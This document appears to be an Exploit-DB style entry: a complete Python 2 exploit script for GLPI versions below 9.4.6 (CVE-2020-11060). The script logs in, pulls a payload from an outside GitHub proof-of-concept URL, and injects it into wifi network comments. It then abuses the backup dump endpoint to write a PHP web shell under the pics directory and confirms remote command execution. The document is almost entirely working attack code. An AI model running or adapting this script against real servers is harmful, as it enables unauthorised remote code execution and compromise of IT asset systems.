@@ -1,0 +1,241 @@
+# Exploit Title: GLPI 9.4.5 - Remote Code Execution (RCE)
+# Exploit Author: Brian Peters
+# Vendor Homepage: https://glpi-project.org
+# Software Link: https://github.com/glpi-project/glpi/releases
+# Version: < 9.4.6
+# CVE: CVE-2020-11060
+
+# Download a SQL dump and find the table offset for "wifinetworks" with 
+# cat <sqlfile> | grep "CREATE TABLE" | grep -n wifinetworks
+# Update the offsettable value with this number in the create_dump function
+# The Nix/Win paths are based on defaults. You can use curl -I <url> and use md5sum to find the path based
+# on the Set-Cookie hash.
+
+#!/usr/bin/python
+
+import argparse
+import json
+import random
+import re
+import requests
+import string
+import sys
+import time
+from datetime import datetime
+from lxml import html
+
+class GlpiBrowser:
+    
+    def __init__(self, url, user, password, platform):
+        self.url = url
+        self.user = user
+        self.password = password
+        self.platform = platform
+        
+        self.session = requests.Session()
+        self.session.verify = False
+        requests.packages.urllib3.disable_warnings()
+    
+    def extract_csrf(self, html):
+        return re.findall('name="_glpi_csrf_token" value="([a-f0-9]{32})"', html)[0]
+    
+    def get_login_data(self):
+        r = self.session.get('{0}'.format(self.url), allow_redirects=True)
+        
+        csrf_token = self.extract_csrf(r.text)
+        name_field = re.findall('name="(.*)" id="login_name"', r.text)[0]
+        pass_field = re.findall('name="(.*)" id="login_password"', r.text)[0]
+        
+        return name_field, pass_field, csrf_token
+    
+    def login(self):
+        try:
+            name_field, pass_field, csrf_token = self.get_login_data()
+        except Exception as e:
+            print "[-] Login error: could not retrieve form data"
+            sys.exit(1)
+        
+        data = {
+            name_field: self.user, 
+            pass_field: self.password,
+            "auth": "local",
+            "submit": "Post",
+            "_glpi_csrf_token": csrf_token
+        }
+        
+        r = self.session.post('{}/front/login.php'.format(self.url), data=data, allow_redirects=False)
+        
+        return r.status_code == 302
+        
+    def wipe_networks(self, padding, datemod):
+        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
+        comment = r.content
+        
+        r = self.session.get('{0}/front/wifinetwork.php#modal_massaction_contentb5e83b3aa28f203595c34c5dbcea85c9'.format(self.url))
+        try:
+            csrf_token = self.extract_csrf(r.text)
+        except Exception as e:
+            print "[-] Edit network error: could not retrieve form data"
+            sys.exit(1)
+            
+        webpage = html.fromstring(r.content)
+        links = webpage.xpath('//a/@href')
+        for rawlink in links:
+            if "wifinetwork.form.php?id=" in rawlink:
+        	rawlinkparts = rawlink.split("=")
+        	networkid = rawlinkparts[-1]
+        	print "Deleting network "+networkid
+        	
+        	data = {
+        	    "entities_id": "0",
+	            "is_recursive": "0",
+        	    "name": "PoC",
+        	    "comment": comment,
+        	    "essid": "RCE"+padding,
+        	    "mode": "ad-hoc",
+		    "purge": "Delete permanently",
+		    "id": networkid,
+                    "_glpi_csrf_token": csrf_token,
+                    '_read_date_mod': datemod
+                }
+        
+                r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
+    
+    def create_network(self, datemod):
+        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
+        comment = r.content
+
+        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
+        try:
+            csrf_token = self.extract_csrf(r.text)
+        except Exception as e:
+            print "[-] Create network error: could not retrieve form data"
+            sys.exit(1)
+        
+        data = {
+	    "entities_id": "0",
+	    "is_recursive": "0",
+	    "name": "PoC",
+	    "comment": comment,
+	    "essid": "RCE",
+	    "mode": "ad-hoc",
+	    "add": "ADD",
+            "_glpi_csrf_token": csrf_token,
+            '_read_date_mod': datemod
+        }
+        
+        r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
+        print "[+] Network created"
+        print "      Name: PoC"
+        print "      ESSID: RCE"
+        
+    def edit_network(self, padding, datemod):
+        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
+        comment = r.content
+        #create the padding for the name and essid
+        
+        
+        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
+        webpage = html.fromstring(r.content)
+        links = webpage.xpath('//a/@href')
+        for rawlink in links:
+            if "wifinetwork.form.php?id=" in rawlink:
+                rawlinkparts = rawlink.split('/')
+                link = rawlinkparts[-1]
+                
+                #edit the network name and essid
+                r = self.session.get('{0}/front/{1}'.format(self.url, link))
+                try:
+            	    csrf_token = self.extract_csrf(r.text)
+        	except Exception as e:
+        	    print "[-] Edit network error: could not retrieve form data"
+        	    sys.exit(1)
+        	    
+        	rawlinkparts = rawlink.split("=")
+        	networkid = rawlinkparts[-1]
+        	        	    
+                data = {
+        	    "entities_id": "0",
+        	    "is_recursive": "0",
+        	    "name": "PoC",
+        	    "comment": comment,
+        	    "essid": "RCE"+padding,
+        	    "mode": "ad-hoc",
+        	    "update": "Save",
+        	    "id": networkid,
+                    "_glpi_csrf_token": csrf_token,
+                    "_read_date_mod": datemod
+                }
+                r = self.session.post('{0}/front/wifinetwork.form.php'.format(self.url), data=data)
+                print "[+] Network mofified"
+                print "      New ESSID: RCE"+padding
+    
+    def create_dump(self, shellname):
+        path=''
+        if self.platform == "Win":
+            path="C:\\xampp\\htdocs\\pics\\"
+        elif self.platform == "Nix":
+            path="/var/www/html/glpi/pics/"
+        
+        #adjust offset number to match the table number for wifi_networks
+        #this can be found by downloading a SQL dump and running cat <dumpname> | grep "CREATE TABLE" | grep -n "wifinetworks"
+        r = self.session.get('{0}/front/backup.php?dump=dump&offsettable=312&fichier={1}{2}'.format(self.url, path, shellname))
+        
+        print '[+] Shell: {0}/pics/{1}'.format(self.url, shellname)
+        
+    def shell_check(self, shellname):
+        r = self.session.get('{0}/pics/{1}?0=echo%20asdfasdfasdf'.format(self.url, shellname))
+        print "      Shell size: "+str(len(r.content))
+        if "asdfasdfasdf" in r.content:
+            print "[+] RCE FOUND!"
+            sys.exit(1)
+        return len(r.content)
+    
+    def pwn(self):
+        if not self.login():
+            print "[-] Login error"
+            return
+        else:
+            print "[+] Logged in"
+
+	#create timestamp
+	now = datetime.now()
+	datemod = now.strftime("%Y-%m-%d %H:%M:%S")
+
+        #create comment payload
+        
+        tick=1
+	while True:
+	    #create random shell name
+            letters = string.ascii_letters
+	    shellname = ''.join(random.choice(letters) for i in range(8))+".php"
+	    
+	    #create padding for ESSID
+	    padding = ''
+            for i in range(1,int(tick)+1):
+                padding+=str(i)
+	    
+	    self.wipe_networks(padding, datemod)
+	    self.create_network(datemod)
+            self.edit_network(padding, datemod)            
+            self.create_dump(shellname)
+            self.shell_check(shellname)
+	    print "\n"
+            raw_input("Press any key to continue with the next iteration...")
+            tick+=1
+
+        return
+        
+if __name__ == '__main__':
+    
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--url", help="Target URL", required=True)
+    parser.add_argument("--user", help="Username", required=True)
+    parser.add_argument("--password", help="Password", required=True)
+    parser.add_argument("--platform", help="Win/Nix", required=True)
+    
+    args = parser.parse_args()
+    
+    g = GlpiBrowser(args.url, user=args.user, password=args.password, platform=args.platform)
+    
+    g.pwn()
